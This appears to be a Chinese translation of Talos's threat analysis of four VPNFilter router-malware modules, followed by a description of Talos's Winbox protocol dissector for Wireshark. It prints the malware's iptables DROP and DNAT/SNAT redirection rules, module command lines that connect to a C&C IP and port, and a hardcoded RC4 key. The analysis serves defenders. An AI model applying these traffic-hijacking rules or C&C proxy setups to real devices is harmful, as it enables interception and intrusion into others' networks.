@@ -1,0 +1,70 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<p>本文翻译自：<br/>
+<a href="https://blog.talosintelligence.com/2018/09/vpnfilter-part-3.html" target="_blank">https://blog.talosintelligence.com/2018/09/vpnfilter-part-3.html</a></p>
+<hr/>
+<p><a href="https://xz.aliyun.com/t/2813" target="_blank">https://xz.aliyun.com/t/2813</a> 中提到VPNFilter更新过程中共加入7个新模块，本文继续分析其余4个模块。</p>
+<h1 data-content="1" id="8d64340e725128ad08ccf59c15d2194d">netfilter（DOS工具）</h1>
+<p>Netfilter在命令行中也会有三个参数，但前二个参数是不用的，第三个参数是格式<code>&lt;block/unblock&gt; &lt;# of minutes&gt;</code>中引用的字符串。<code>&lt;# of minutes&gt;</code>是netfilter在退出前要执行的时间。如果<code>block</code>是第三个参数的第一部分，netfilter就会将下面的规则加入iptables：</p>
+<pre><code>Chain FORWARD (policy ACCEPT)
+target     prot opt source         destination
+DROP        tcp -- anywhere        anywhere       tcpflags: PSH/PSH</code></pre>
+<p>添加了规则后，netfilter会等30秒然后删除该规则。然后与<code># of minutes</code>的时间进行比较，如果还有剩下的时间，该进程就再次执行。添加和删除的循环能确保event中一直有该规则。</p>
+<p>一旦超时，该程序就退出。Signal handlers会在netfilter程序中安装，如果程序接收到SIGINT或SIGTERM，netfilter程序会删除iptables规则，然后退出。</p>
+<p>最后，<code>unblock</code>参数可以删除之前用<code>block</code>参数添加的iptables规则。</p>
+<p>Netfilter模块可能主要是用于限制对特定形式的加密应用的访问。</p>
+<h1 data-content="1" id="a7220eee1fa942cc3d82b88ba85680fb">portforwarding</h1>
+<p>Portforwarding模块会执行下面的命令和参数：</p>
+<pre><code>portforwarding &lt;unused&gt; &lt;unused&gt; "start &lt;IP1&gt; &lt;PORT1&gt; &lt;IP2&gt; &lt;PORT2&gt;"</code></pre>
+<p>根据这些参数，portforwarding模块会通过安装下面的iptables规则来转发特定端口和IP的流量到另一个端口和IP：</p>
+<pre><code>iptables -t nat -I PREROUTING 1 -p tcp -m tcp -d &lt;IP1&gt; --dport &lt;PORT1&gt; -j DNAT --to-destination &lt;IP2&gt;:&lt;PORT2&gt;</code></pre>
+<pre><code>iptables -t nat -I POSTROUTING 1 -p tcp -m tcp -d &lt;IP2&gt; --dport &lt;PORT2&gt; -j SNAT --to-source &lt;device IP&gt;</code></pre>
+<p>这些规则使通过受感染设备的到IP1: PORT1的流量被重定向到IP2: PORT2 。第二条规则会修改重定向的流量的源地址到受感染的设备来确保响应消息发送给受感染的设备。</p>
+<p>在安装ipables规则前，portforwarding模块首先会创建一个到IP2 port2的socket连接来检查IP2是否可达。但socket关闭前也没有数据发送。<br/>
+与其他操作iptables的模块类似，portforwarding模块会进入添加规则、等待、删除规则的循环以确保规则一直保留在设备中。</p>
+<h1 data-content="1" id="7ca818f45baaeec5f120a72566e80481">socks5proxy</h1>
+<p>socks5proxy模块是一个基于开源项目shadowsocks的SOCKS5代理服务器。服务器不使用认证，通过硬编码来监听TCP 5380端口。在服务器开启前，socks5proxy fork会根据模块提供的参数连接到C2服务器。如果服务器不能在短时间（几秒）内响应，fork就会kill父进程然后退出。C2服务器会响应正常执行或中止的命令。</p>
+<p>该模块含有下面的使用字符串，虽然与socks5proxy模块的参数不一致，但是这些设置不能通过命令行参数进行修改：</p>
+<pre><code>ssserver
+    --username &lt;username&gt; username for auth
+    --password &lt;password&gt; password for auth
+    -p, --port &lt;port&gt; server port, default to 1080
+    -d run in daemon
+    --loglevel &lt;level&gt; log levels: fatal, error, warning, info, debug, trace
+    -h, --help help</code></pre>
+<p>socks5proxy模块的真实命令行参数为：</p>
+<pre><code>./socks5proxy &lt;unused&gt; &lt;unused&gt; "start &lt;C&amp;C IP&gt; &lt;C&amp;C port&gt;"</code></pre>
+<p>socks5proxy模块会确认参数的个数大于1，但是如果有2个参数，其中一个是SIGSEV信号进程就会奔溃，说明恶意软件工具链在开发过程中有质量缺陷。</p>
+<h1 data-content="1" id="dc970c49dcfd5ea49be80a976ba1034d">tcpvpn</h1>
+<p>tcpvpn模块是一个反向TCP（Reverse-TCP）VPN模块，允许远程攻击者访问已感染设备所在的内部网络。该模块与远程服务器通信，服务器可以创建类似TunTap之类的设备，通过TCP连接转发数据包。连接请求由网络设备发出，因此可能帮助该模块绕过某些简单的防火墙或者NAT限制。该模块类似于Cobalt Strike这款渗透测试软件的VPN Pivoting功能。</p>
+<p>所有数据都是RC4加密的，key是用硬编码的字节生成的。</p>
+<pre><code>"213B482A724B7C5F4D77532B45212D215E79433D794A54682E6B653A56796E457A2D7E3B3A2D513B6B515E775E2D7E533B51455A68365E6A67665F34527A7347"</code></pre>
+<p>与tcpvpn模块关联的命令行语法：</p>
+<pre><code>./tcpvpn &lt;unused&gt; &lt;unused&gt; "start &lt;C&amp;C IP&gt; &lt;C&amp;C port&gt;"</code></pre>
+<h1 data-content="1" id="3835a949ea516a997f74fd35121f6b8c">MikroTik</h1>
+<h2 data-content="1" id="8e4c7610598968aa1f8db00ad9cacb06">Winbox Protocol Dissector</h2>
+<p>研究人员在研究VPNFilter时，需要了解这些设备是如何被入侵的。在分析MikroTik设备时，研究人员发现了一个开放端口TCP 8291，配置工具Winbox用端口TCP 8291进行通信。</p>
+<p>来自这些设备的流量多为二进制数据，因此我们无法在不使用协议解析器的情况下来分析该协议所能触及的访问路径。因此，研究人员决定自己开发协议解析器，协议解析器与包分析工具配合使用开源设计防止未来感染的有效规则。</p>
+<p>比如，CVE-2018-14847允许攻击者执行目录遍历来进行非认证的凭证恢复。协议解析器在分析该漏洞中起了很大的作用。</p>
+<h2 data-content="1" id="db03b10b327adcd9494f9e63ff027a99">Winbox协议</h2>
+<p>Winbox来源于MikroTik提供的Winbox客户端，用作Web GUI的替代方案。</p>
+<p>官方文档称，Winbox是一个小工具，可以使用快速简单地通过GUI来管理MikroTik RouterOS。这是一个原生的Win32程序，但也可以通过Wine运行在Linux以及MacOS上。所有的Winbox接口函数都尽可能与控制台函数耦合。但Winbox无法修改某些高级以及关键系统配置，比如无法修改某个接口的MAC地址。</p>
+<p>但Winbox协议并非官方名词，只是与官方客户端匹配，因此选择沿用该名词。</p>
+<h2 data-content="1" id="8a9a23332bcf12575cfdcf69c5382b3c">使用解析器</h2>
+<p>解析器安装起来非常简单，由于这是一个基于LUA的解析器，因此无需重新编译。只需要将<code>Winbox_Dissector.lua</code>文件放入<code>/$HOME/.wireshark/plugins</code>目录即可。默认情况下，只要安装了这个解析器，就能正确解析来自或者发往TCP 8291端口的所有流量。</p>
+<p>来自客户端/服务器的单条消息解析起来更加方便，然而实际环境中总会遇到各种各样的情况。观察实时通信数据后，我们证实Winbox消息可以使用各种格式进行发送。</p>
+<p>我们捕获过的Winbox通信数据具备各种属性，比如：</p>
+<ol>
+<li>在同一个报文中发送多条消息；</li>
+<li>消息中包含1个或多个2字节的“chunks”数据，我们在解析之前需要删除这些数据；</li>
+<li>消息过长，无法使用单个报文发送——出现TCP重组情况；</li>
+<li>包含其他“嵌套”消息的消息。</li>
+</ol>
+<p>在安装解析器之前捕获得到数据包如下图所示：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180927210040-56277eac-c255-1.png"/></p>
+<p>安装Winbox协议解析器后，Wireshark可以正确地解析通信数据，如下图所示：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180927210052-5cf83424-c255-1.png"/></p>
+<h2 data-content="1" id="07276bc3a99469303bf282c1a6cc5676">获取解析器</h2>
+<p>思科Talos团队开源了该工具，下载地址：<a href="https://github.com/Cisco-Talos/Winbox_Protocol_Dissector" target="_blank">https://github.com/Cisco-Talos/Winbox_Protocol_Dissector</a></p>
+</div>
+</div>
